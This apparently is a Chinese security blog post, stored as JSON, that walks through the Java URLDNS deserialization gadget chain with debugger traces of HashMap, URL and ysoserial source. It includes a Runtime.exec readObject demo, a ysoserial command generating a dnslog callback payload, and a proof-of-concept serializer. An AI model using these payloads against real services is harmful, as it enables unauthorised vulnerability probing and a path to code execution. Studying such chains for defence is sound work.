[{"title":"URLDNS分析","url":"/2021/11/23/URLDNS/","content":"\n学习了很久的Java基础，也看了很多的Java反序列化分析，现在也来分析学习哈最基础的URLDNS反序列化吧。\n\n\n\nJava反序列化基础\n为了方便数据的存储，于是乎有了现在的Java序列化于反序列化。序列化就是将Java对象存储到一个文件，反序列化则是读取序列化生产的文件，还原Java对象，常见的基础反序列化。\n\n首先类需要实现Serializable这个接口，虽然这个接口里面没有东西，但是不实现这个接口则无法序列化。用transient 关键字修饰的属性除外，不参与序列化过程。\n\nObjectOutputStream.writeObject()序列化对象。\n\nObjectInputStream.readObject()读取我们的对象，这里也是我们反序列化的利用点。\n// SerializeAndUnserialize.javapackage JavaSecurity.URLDNS;import java.io.*;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.ObjectInputStream;public class SerializeAndUnSerialize&#123;    public static void main(String[] args) throws Exception&#123;//        正常反序列化        serializeToFile(&quot;User.ser&quot;);        unSerializeToObject(&quot;User.ser&quot;);//        恶意反序列化        evilObject(&quot;Evil.ser&quot;);    &#125;    public static void serializeToFile(String file) throws IOException&#123;        User user = new User(&quot;Pan3a&quot;);        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(user);        objectOutputStream.flush();        objectOutputStream.close();    &#125;    public static void unSerializeToObject(String file) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        User user = (User)objectInputStream.readObject();        objectInputStream.close();        System.out.println(user.getName());        user.setName(&quot;Forever404&quot;);        System.out.println(user.getName());    &#125;    public static void evilObject(String file) throws Exception&#123;        Evil evil = new Evil();        evil.command = &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(evil);        objectOutputStream.flush();        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        objectInputStream.readObject();        objectInputStream.close();    &#125;&#125;class User implements Serializable&#123;    private String name;    public User(String name)&#123;        this.name = name;    &#125;    public String getName()&#123;        return this.name;    &#125;    public void setName(String name)&#123;        this.name = name;    &#125;    private void writeObject(ObjectOutputStream objectOutputStream) throws IOException &#123;        objectOutputStream.defaultWriteObject();        objectOutputStream.writeObject(&quot;Hello, This is writeObject!!&quot;);    &#125;    private void readObject(ObjectInputStream objectInputStream) throws IOException,ClassNotFoundException&#123;        objectInputStream.defaultReadObject();        String message = (String) objectInputStream.readObject();        System.out.println(message);    &#125;&#125;class Evil implements Serializable&#123;    public String command;    private void readObject(ObjectInputStream objectInputStream) throws IOException,ClassNotFoundException&#123;        objectInputStream.defaultReadObject();        Runtime.getRuntime().exec(command);    &#125;&#125;\n输出\nHello, This is writeObject!!Pan3aForever404\n这里序列化生成的数据。\n\n\n\n\n分析Evil类，这里控制了该类的readObject方法，那么则可能造成漏洞。\n\n\nYsoserial\nysoserial是一个Java反序列化漏洞利用工具，通常用于检测是否存在Java反序列化漏洞。\n\nhttps://github.com/frohoff/ysoserial\n\n这里可以将其克隆下来再将其打包成jar文件即可，然后会在生成一个target目录，里面就有生成的jar。\nmvn clean package -DskipTests\n\n生成payload\nhttp://www.dnslog.cn/\n\n获取一个DNS。\n\n\n\n\n生成我们的payload。\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;[http://0ehcf6.dnslog.cn&quot;](http://0ehcf6.dnslog.cn&quot;) &gt; ~/Temp/URLDNS.ser\n\n\n编写漏洞代码// URLDNSYsoSerialTestpackage JavaSecurity.URLDNS;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class URLDNSYsoSerialTest &#123;    public static void main(String[] args) throws IOException,ClassNotFoundException &#123;        FileInputStream inputStream = new FileInputStream(&quot;/Users/pan3a/Temp/URLDNS.ser&quot;);        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);        objectInputStream.readObject();    &#125;&#125;\n\n\nDNS获取到请求记录。\n\n\nURLDNS\nURLDNS，它的功能正如其名发起DNS请求，因此无法回显，只能检测Java反序列化漏洞，构造好测试代码，然后开始调试。\npackage JavaSecurity.URLDNS;import java.io.*;import java.net.InetAddress;import java.net.URL;import java.util.HashMap;import java.lang.reflect.Field;import java.io.ObjectOutputStream;public class URLDNSPoc &#123;    public static void main(String[] args) throws Exception&#123;        urlDns();        unSerializeToObject(&quot;urlDns.ser&quot;);//        addressGetByName();    &#125;    public static void urlDns() throws Exception &#123;        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();        URL url = new URL(&quot;https://pjm4n7.dnslog.cn&quot;);        Class&lt;? &gt; clazz = Class.forName(&quot;java.net.URL&quot;);        Field field = clazz.getDeclaredField(&quot;hashCode&quot;);        field.setAccessible(true);        hashMap.put(url, &quot;Pan3a&quot;);        field.set(url, -1);        serializeToFile(&quot;urlDns.ser&quot;, hashMap);    &#125;    public static void serializeToFile(String file,Object object) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(object);    &#125;    public static void unSerializeToObject(String file) throws Exception &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        objectInputStream.readObject();    &#125;    //   最后发现是由getByName函数发起DNS请求，测试证明。    public static void addressGetByName() throws Exception&#123;        URL url = new URL(&quot;https://pjm4n7.dnslog.cn&quot;);        String host = url.getHost();        InetAddress addr = InetAddress.getByName(host);        String domainName = addr.getHostName();//获得主机名        String IPName = addr.getHostAddress();//获得IP地址        System.out.println(&quot;hostname:&quot; + domainName);        System.out.println(&quot;IPName:&quot; + IPName);    &#125;&#125;\n由于知道网上的利用链（Gatget Chain）是在HashMap的readObject方法触发的，因此我们直接在HashMap的readObject方法处下断点位置下断点即可，有些可能因为IDEA默认配置有个黑名单调试时不进入某些类，我们直接取消该选项。（因个人喜而异，能调试都可以。）\n\n\n\n\n在HashMap类的1367行进入了调试模式，接下来继续向下跟。\n\n\nprivate void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;\n\n\n这里一直向下跟进直到36行的一个for循环发现这里有readObject方法，我们传入的key又是java.net.URL对象，继续向下走然后到41行的的putVal方法，再继续跟进hash方法。\n\n\n\n跟进hash方法后，因为key不为空，发现里面的hashCode方法，那么继续跟进。\nstatic final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;\n这里是java.net.URL对象，因此跟进到URL.java的898行，当时的hashCode值为-1，因此进入下面的handler的hashCode方法。\npublic synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;\nhandler又是URLStreamHandler的对象，于是乎跟进URLStreamHandler的第350行，这里的参数u则是我们刚才传递的URL对象。\nprotected int hashCode(URL u) &#123;        int h = 0;        // Generate the protocol part.        String protocol = u.getProtocol();        if (protocol != null)            h += protocol.hashCode();        // Generate the host part.        InetAddress addr = getHostAddress(u);        if (addr != null) &#123;            h += addr.hashCode();        &#125; else &#123;            String host = u.getHost();            if (host != null)                h += host.toLowerCase().hashCode();        &#125;        // Generate the file part.        String file = u.getFile();        if (file != null)            h += file.hashCode();        // Generate the port part.        if (u.getPort() == -1)            h += getDefaultPort();        else            h += u.getPort();        // Generate the ref part.        String ref = u.getRef();        if (ref != null)            h += ref.hashCode();        return h;    &#125;\n第10行获取host和port跟进。\nprotected synchronized InetAddress getHostAddress(URL u) &#123;    if (u.hostAddress != null)        return u.hostAddress;    String host = u.getHost();    if (host == null || host.equals(&quot;&quot;)) &#123;        return null;    &#125; else &#123;        try &#123;            u.hostAddress = InetAddress.getByName(host);        &#125; catch (UnknownHostException ex) &#123;            return null;        &#125; catch (SecurityException se) &#123;            return null;        &#125;    &#125;    return u.hostAddress;&#125;\nInetAddress.getByName则进行一次DNS请求获取，到这里差不多也就结束了。\n\ngadGet Chain\nHashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName()\n\nYsoseria分析环境搭建\n直接用IDEA打开我们克隆下来的项目，由于我有两个Java版本自动把项目配置为JDK14了，因此需要更改JDK版本，打开File-&gt;Project Structure。\n\n\n\n\n有pom.xml得知我们的主类文件是GeneratePayload.java，运行查看环境是否成功。\n\n\n\n由于他是命令行获取的参数，因此我们配置当前文件运行参数，或者自己注释获取参数的17-20代码，直接给出传递的参数值，这里就采用配置参数的形式。\n\n\n调试分析\n这里断点直接放到第9行。\npublic static void main(final String[] args) &#123;\tif (args.length != 2) &#123;\t\tprintUsage();\t\tSystem.exit(USAGE_CODE);\t&#125;\tfinal String payloadType = args[0];\tfinal String command = args[1];\tfinal Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);\tif (payloadClass == null) &#123;\t\tSystem.err.println(&quot;Invalid payload type &#x27;&quot; + payloadType + &quot;&#x27;&quot;);\t\tprintUsage();\t\tSystem.exit(USAGE_CODE);\t\treturn; // make null analysis happy\t&#125;\ttry &#123;\t\tfinal ObjectPayload payload = payloadClass.newInstance();\t\tfinal Object object = payload.getObject(command);\t\tPrintStream out = System.out;\t\tSerializer.serialize(object, out);\t\tObjectPayload.Utils.releasePayload(payload, object);\t&#125; catch (Throwable e) &#123;\t\tSystem.err.println(&quot;Error while generating or serializing payload&quot;);\t\te.printStackTrace();\t\tSystem.exit(INTERNAL_ERROR_CODE);\t&#125;\tSystem.exit(0);&#125;\n来到Utils.getPayloadClass，这里是payloadType则是我们第攻击模块，这里传递的是URLDNS。\npublic static Class&lt;? extends ObjectPayload&gt; getPayloadClass ( final String className ) &#123;     Class&lt;? extends ObjectPayload&gt; clazz = null;     try &#123;         clazz = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);     &#125;     catch ( Exception e1 ) &#123;&#125;     if ( clazz == null ) &#123;         try &#123;             return clazz = (Class&lt;? extends ObjectPayload&gt;) Class                     .forName(GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className);         &#125;         catch ( Exception e2 ) &#123;&#125;     &#125;     if ( clazz != null &amp;&amp; !ObjectPayload.class.isAssignableFrom(clazz) ) &#123;         clazz = null;     &#125;     return clazz; &#125;\n这里就是利用反射来获取我们需要的类，因为是forName因此需要全限定类名，然后返回获取的类，因为可以获取到URLDNS类payloadClass则不为空，进入try代码块。\ntry &#123;\t\t\tfinal ObjectPayload payload = payloadClass.newInstance();\t\t\tfinal Object object = payload.getObject(command);\t\t\tPrintStream out = System.out;\t\t\tSerializer.serialize(object, out);\t\t\tObjectPayload.Utils.releasePayload(payload, object);\t\t&#125;\n将URLDNS类通过反序列化的方式进行初始化，然后进入getObject方法。\npublic Object getObject(final String url) throws Exception &#123;        //Avoid DNS resolution during payload creation        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.        URLStreamHandler handler = new SilentURLStreamHandler();        HashMap ht = new HashMap(); // HashMap that will contain the URL        URL u = new URL(null, url, handler); // URL to use as the Key        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.        return ht;&#125;\n这里又实例化了SilentURLStreamHandler()，继续向下跟进。\nstatic class SilentURLStreamHandler extends URLStreamHandler &#123;                protected URLConnection openConnection(URL u) throws IOException &#123;                        return null;                &#125;                protected synchronized InetAddress getHostAddress(URL u) &#123;                        return null;                &#125;        &#125;\n这里继承了URLStreamHandler，重写了下面两个方法，其中让getHostAddress为空，因此不会触发InetAddress.getByName从而没有DNS请求，对比哈原生URLStreamHandler类。\nprotected synchronized InetAddress getHostAddress(URL u) &#123;        if (u.hostAddress != null)            return u.hostAddress;        String host = u.getHost();        if (host == null || host.equals(&quot;&quot;)) &#123;            return null;        &#125; else &#123;            try &#123;                u.hostAddress = InetAddress.getByName(host);            &#125; catch (UnknownHostException ex) &#123;                return null;            &#125; catch (SecurityException se) &#123;                return null;            &#125;        &#125;        return u.hostAddress;    &#125;\n接下来就是基础的通过反射使URL对象的hashCode值为-1，然后返回对象。再调用Serializer.serialize(object, out)对我们的hashMap对象进行序列化操作。\npublic static void serialize(final Object obj, final OutputStream out) throws IOException &#123;\tfinal ObjectOutputStream objOut = new ObjectOutputStream(out);\tobjOut.writeObject(obj);&#125;\n这里就正常序列化然后调用输出流，ObjectPayload.Utils.releasePayload则是判断URLDNS是否为ReleaseableObjectPayload的一个子类，这个类是是一个接口，定义了一个release方法，然后就结束了，退出程序。\n\n\n\n","categories":["Java安全"]}]